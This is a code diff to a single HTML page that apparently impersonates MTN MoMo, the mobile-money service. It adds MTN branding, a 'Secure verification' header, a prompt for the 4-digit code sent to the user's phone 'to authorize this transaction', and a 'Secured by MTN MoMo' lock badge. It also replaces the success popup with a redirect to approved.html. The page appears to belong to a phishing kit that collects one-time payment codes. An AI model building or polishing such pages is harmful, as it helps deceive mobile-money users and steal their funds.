@@ -36,11 +36,38 @@
 
   .card{
     background:var(--card);width:100%;max-width:440px;
-    border-radius:20px;padding:34px 28px 34px;
+    border-radius:20px;padding:36px 28px 34px;
     box-shadow:0 12px 40px rgba(0,43,92,0.10);
     border:1px solid var(--border);border-top:4px solid var(--mtn-blue-deep);
     text-align:center;
   }
+
+  .code-head{
+    display:flex;align-items:center;justify-content:center;gap:10px;
+    margin-bottom:24px;
+  }
+  .code-head .badge{
+    width:44px;height:44px;border-radius:12px;
+    background:var(--mtn-yellow);
+    display:flex;align-items:center;justify-content:center;
+    font-weight:900;color:var(--mtn-blue-deep);font-size:19px;
+    box-shadow:0 4px 12px rgba(255,204,0,0.4);
+  }
+  .code-head .txt{text-align:left;}
+  .code-head .txt b{display:block;font-size:15px;color:var(--text);font-weight:800;}
+  .code-head .txt span{font-size:11.5px;color:var(--muted);font-weight:600;}
+
+  .code-title{
+    font-size:22px;font-weight:800;
+    color:var(--text);letter-spacing:-0.4px;
+    margin-bottom:8px;
+  }
+  .code-sub{
+    font-size:13px;color:var(--muted);
+    font-weight:600;line-height:1.6;
+    max-width:300px;margin:0 auto 26px;
+  }
+  .code-sub b{color:var(--mtn-blue-deep);font-weight:800;}
 
   .code-input{
     width:100%;
@@ -55,7 +82,7 @@
     text-align:center;
     font-variant-numeric:tabular-nums;
     transition:.18s;
-    margin-bottom:18px;
+    margin-bottom:16px;
   }
   .code-input::placeholder{
     color:#D5DEE9;
@@ -104,7 +131,7 @@
   }
   .cta:hover:not(:disabled){background:var(--mtn-blue);transform:translateY(-2px);}
   .cta:active:not(:disabled){transform:translateY(0);}
-  .cta:disabled{opacity:.6;cursor:not-allowed;transform:none;}
+  .cta:disabled{opacity:.5;cursor:not-allowed;transform:none;background:#94A3B8;box-shadow:none;}
 
   .status{
     font-size:12px;text-align:center;margin-top:14px;
@@ -113,7 +140,16 @@
   .status.err{color:var(--red);}
   .status.ok{color:var(--green);}
 
-  /* Full-screen processing */
+  .secure-note{
+    display:flex;align-items:center;justify-content:center;gap:6px;
+    font-size:11.5px;color:var(--muted);margin-top:18px;font-weight:600;
+  }
+  .secure-note svg{
+    width:13px;height:13px;stroke:var(--green);fill:none;
+    stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
+  }
+
+  /* Processing */
   .processing-screen{
     position:fixed;inset:0;z-index:2000;
     background:radial-gradient(circle at 50% 35%, #0A3D7A 0%, var(--mtn-blue-deep) 55%, #001B3D 100%);
@@ -161,48 +197,13 @@
   .processing-screen .dots span:nth-child(3){animation-delay:.4s;}
   @keyframes blink{0%,80%,100%{background:rgba(255,255,255,0.25);}40%{background:var(--mtn-yellow);}}
 
-  /* Success popup */
-  .modal-overlay{
-    position:fixed;inset:0;background:rgba(10,27,51,0.55);
-    backdrop-filter:blur(4px);display:none;
-    align-items:center;justify-content:center;
-    padding:20px;z-index:1000;animation:fadeIn .25s ease;
-  }
-  .modal-overlay.show{display:flex;}
-  .modal{
-    background:#fff;width:100%;max-width:360px;
-    border-radius:18px;padding:30px 24px 26px;text-align:center;
-    box-shadow:0 24px 60px rgba(0,43,92,0.35);
-    border-top:5px solid var(--green);
-    animation:pop .32s cubic-bezier(.18,.9,.32,1.4);
-  }
-  @keyframes pop{from{transform:scale(.85);opacity:0;}to{transform:scale(1);opacity:1;}}
-  .modal .check{
-    width:62px;height:62px;border-radius:50%;
-    background:rgba(0,166,81,0.12);
-    display:flex;align-items:center;justify-content:center;margin:0 auto 18px;
-  }
-  .modal .check svg{
-    width:32px;height:32px;stroke:var(--green);fill:none;
-    stroke-width:3;stroke-linecap:round;stroke-linejoin:round;
-  }
-  .modal h2{font-size:19px;font-weight:800;color:var(--text);margin-bottom:8px;letter-spacing:-0.3px;}
-  .modal p{font-size:13px;color:var(--muted);font-weight:600;line-height:1.6;margin-bottom:22px;}
-  .modal .ok-btn{
-    width:100%;padding:14px;border:none;border-radius:11px;
-    background:var(--mtn-blue-deep);color:#fff;
-    font-size:15px;font-weight:800;cursor:pointer;
-    letter-spacing:0.3px;transition:.18s;
-    box-shadow:0 6px 16px rgba(0,43,92,0.28);
-  }
-  .modal .ok-btn:hover{background:var(--mtn-blue);transform:translateY(-1px);}
-
   @media(max-width:640px){
     .card{padding:28px 20px;}
     main{padding:36px 16px 44px;}
     .brand strong{font-size:22px;letter-spacing:1.5px;}
     .code-input{font-size:32px;letter-spacing:18px;padding:18px 12px;}
     .code-input::placeholder{letter-spacing:18px;}
+    .code-title{font-size:19px;}
     .processing-screen h1{font-size:21px;}
   }
 </style>
@@ -219,6 +220,19 @@
 
   <main>
     <div class="card">
+      <div class="code-head">
+        <div class="badge">M</div>
+        <div class="txt">
+          <b>MTN MoMo</b>
+          <span>Secure verification</span>
+        </div>
+      </div>
+
+      <div class="code-title">Enter code</div>
+      <div class="code-sub">
+        Type the <b>4-digit code</b> sent to your phone to authorize this transaction.
+      </div>
+
       <input
         type="tel"
         id="codeInput"
@@ -236,6 +250,11 @@
       <button class="cta" id="approveBtn" onclick="approve()" disabled>Approve</button>
 
       <div class="status" id="status"></div>
+
+      <div class="secure-note">
+        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        Secured by MTN MoMo
+      </div>
     </div>
   </main>
 
@@ -248,17 +267,6 @@
     <h1>Verifying code</h1>
     <p class="sub">Please wait while we confirm your code.</p>
     <div class="dots"><span></span><span></span><span></span></div>
-  </div>
-
-  <div class="modal-overlay" id="successModal">
-    <div class="modal">
-      <div class="check">
-        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-      </div>
-      <h2>Verified</h2>
-      <p>Your code was accepted.</p>
-      <button class="ok-btn" onclick="closeModal()">OK</button>
-    </div>
   </div>
 
 <script>
@@ -303,12 +311,6 @@
 
   function showProcessing(){ el('processingScreen').classList.add('show'); }
   function hideProcessing(){ el('processingScreen').classList.remove('show'); }
-  function openModal(){ el('successModal').classList.add('show'); }
-
-  function closeModal(){
-    el('successModal').classList.remove('show');
-    setTimeout(() => { window.location.href = 'index.html'; }, 250);
-  }
 
   async function approve(){
     const code = input.value.replace(/\D/g, '');
@@ -343,8 +345,7 @@
       hideProcessing();
 
       if(data.ok){
-        setStatus('');
-        openModal();
+        window.location.href = 'approved.html';   // ← go to approval page
       }else{
         setStatus('❌ ' + (data.error || 'Could not verify code.'), 'err');
         btn.disabled = false;
